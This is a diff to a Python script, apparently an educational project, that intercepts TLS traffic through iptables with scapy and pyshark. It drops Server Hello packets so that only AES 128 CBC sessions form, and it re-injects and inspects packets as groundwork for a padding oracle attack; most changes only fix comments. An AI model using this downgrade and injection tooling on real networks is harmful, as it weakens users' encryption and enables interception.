@@ -13,22 +13,21 @@ load_layer ('tls') #loading the scapy tls layer
 
 
 
-# Define the callback function to process each packet
+
 '''
 This function looks at each packet in the queue that iptables is grabbing and decides on if it should be dropped or not
-The first critia is if the packet is a TLS Server Hello handshake packet and if the cipher is not AES 128 CBC the packet gets dropped
-if it does have the cipher AES 128 CBC it's accepted other TLS handshake packets are ignored. What this does is prevents TLS connections
-from forming if the cipher is not AES 128 CBC which we want as thats the cipher vulnerable to the Padding oracle attack.
+A TLS Server Hello handshake packet is accepted if the cipher is AES 128 CBC. Any other TLS Server hello handshake packet is dropped 
+What this does is prevents TLS connections from forming if the cipher is not AES 128 CBC which we want as thats the cipher vulnerable to the Padding oracle attack.
 
 Next the function checks for TLS application data packets and shows how you would modify it to start the padding oracle attack
 The filter also grabs TLS Encyption Alert packets as this is needed to tell if the modification caused a padding error or a 
 MAC error.
 
-To see the padding attack implementing check out the other code in PaddingOracle folder. It's not implemented here as new SSL libraries
-encypt their alert packets and bundle both the padding and MAC error together to midigate this attack, so you have to do a timing attack
-on the packet keeping track of the repsonse times to guess what the error was. 
+To see the padding attack implemented check out the other code in PaddingOracle folder. It's not implemented here as new SSL libraries
+encypt their alert packets and bundle both the padding and MAC error together to mitigate this attack, so you have to do a timing attack
+on the packet keeping track of the response times to guess what the error was. 
 
-This function uses pyshark and scapy, it uses both as scapy lets you modify packets but doesn't show tls infomation very well so I'm using
+This function uses pyshark and scapy, it uses both as scapy lets you modify packets but doesn't show tls infomation very well so we use
 pyshark to inspect the tls layer.
 '''
 def process_packet(pkt):
@@ -43,7 +42,7 @@ def process_packet(pkt):
         # Write the packet to the file
         scapy.wrpcap(pcap_file_name, [scapy_pkt])
 
-    packetstatus = False #Variable used to check if we're drop or accepted the packet already
+    packetstatus = False #Variable used to check if we've dropped or accepted the packet already
 
     cap = pyshark.FileCapture(pcap_file_name) #Reading out the packet in pyshark
 
@@ -56,7 +55,7 @@ def process_packet(pkt):
             print("Destination IP: {0}".format(packet.ip.dst))
             print("Protocol: {0}".format(packet.transport_layer))
             tls_data = packet.tls._all_fields
-            #Content type 22 is tls handshake so we here looking for Server Hello handshake packets
+            #Content type 22 is tls handshake so here we are looking for Server Hello handshake packets
             if packet.tls.record_content_type == "22":
                 print("HandShake Packet")
                 print("TLS Handshake Type {0}".format(packet.tls.handshake))
@@ -73,12 +72,11 @@ def process_packet(pkt):
                         packetstatus = True
         print("-" * 50)
 
-    # You can also inspect deeper details of the packet layers if needed:
         if 'TLS' in packet:
             #Content type 23 is application data so this will have the encypted message
             if packet.tls.record_content_type == "23":
 
-                packetS = IP(pkt.get_payload()) #This is were scapy doesn't handle TLS well we get the IP layer of the packet and get the tls info from it's payload we also need this packet to create a new one
+                packetS = IP(pkt.get_payload()) #This is where scapy doesn't handle TLS well we get the IP layer of the packet and get the tls info from it's payload we also need this packet to create a new one
                 TLS_scapy_pkt = TLS(pkt.get_payload())
                 payload = TLS_scapy_pkt[Raw].load #Getting the TLS layer in bytes
                 print("Payload")
@@ -92,19 +90,19 @@ def process_packet(pkt):
                 new_packet = IP(dst=packetS[IP].dst, src=packetS[IP].src) / \
                              TCP(dport=packetS[TCP].dport,sport=packetS[TCP].sport, flags="A", seq=packetS[TCP].seq, ack=packetS[TCP].ack) / \
                              payload
-                new_packet = new_packet.__class__(bytes(new_packet)) #This recalculates and missing fields in the packe
+                new_packet = new_packet.__class__(bytes(new_packet)) #This recalculates any missing fields in the packet
                 
                 send(new_packet) #Send our modified packet
                 print("sent modifid packet")
 #               pkt.drop() # Here we can drop the original packet so only our packet gets through 
                 packetstatus = True
-                #Note in this example the packet is not modified but shows how you can modify the packet to prefom the attacl
+                #Note in this example the packet is not modified but shows how you can modify the packet to perfom the attack
 
 
-    #Here we're looking for packet that are TLS Alert packets Scapy for some reason doesn't see them as TLS so we need to look at every packet and look at the headers
+    #Here we're looking for TLS Alert packets Scapy for some reason doesn't see them as TLS so we need to look at every packet and look at the headers
     IP_scapy_pkt = IP(pkt.get_payload())
     if IP_scapy_pkt.haslayer(Raw):
-        #IF the first byte of the packet payload is 0x15 or 21 which is the content type for Encypted Alert we have the packet we're looking for, 
+        #If the first byte of the packet payload is 0x15 or 21 which is the content type for Encypted Alert we have the packet we're looking for, 
         if 0x15 == bytearray(IP_scapy_pkt[Raw].load)[0]:
             #Printing out the alert here we'd need to time the response from when the modified packet was sent to tell what type of alert is was
             TLSdataClass = TLSAlert(pkt.get_payload())
@@ -119,7 +117,7 @@ def process_packet(pkt):
             print("This is the error alert PACKET. We want to look for this Packet for when get error response back from the server")
             packetstatus = True 
 
-    # Check if the packet has an IP layer
+
     #This is just printing out the packet info so we can note that a packet was seen
     if IP_scapy_pkt.haslayer(IP):
         ip_src = IP_scapy_pkt[IP].src
